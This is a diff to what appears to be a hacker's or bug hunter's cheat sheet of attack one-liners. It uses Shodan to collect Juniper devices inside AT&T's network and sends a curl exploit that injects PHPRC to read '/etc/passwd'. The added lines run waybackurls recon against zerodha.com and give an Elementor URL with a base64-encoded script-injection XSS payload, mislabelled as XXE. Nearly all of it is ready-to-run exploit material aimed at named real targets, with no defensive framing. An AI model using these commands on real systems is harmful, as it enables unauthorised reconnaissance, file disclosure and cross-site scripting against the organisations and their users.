@@ -4,3 +4,6 @@ shodan download Juniper 'http.favicon.hash:2141724739 org:"AT&T Services Inc."'
 # Extract file and output only ip with port
 shodan parse Juniper.json.gz --fields ip_str,port --separator " " | awk '{print $1":"$2}' | anew Juniper_ips
 curl -kv "https://<target>/about.php?PHPRC=/dev/fd/0" --data-binary 'auto_prepend_file="/etc/passwd"'
+wordpress xxe 
+waybackurls zerodha.com | grep “wp-content” | httpx -mc 200
+https://redacted.com/blog/#elementor-action:action=lightbox&settings=eyJ0eXBlIjoibnVsbCIsImh0bWwiOiI8c2NyaXB0PmFsZXJ0KCd4c3MnKTwvc2NyaXB0PiJ9
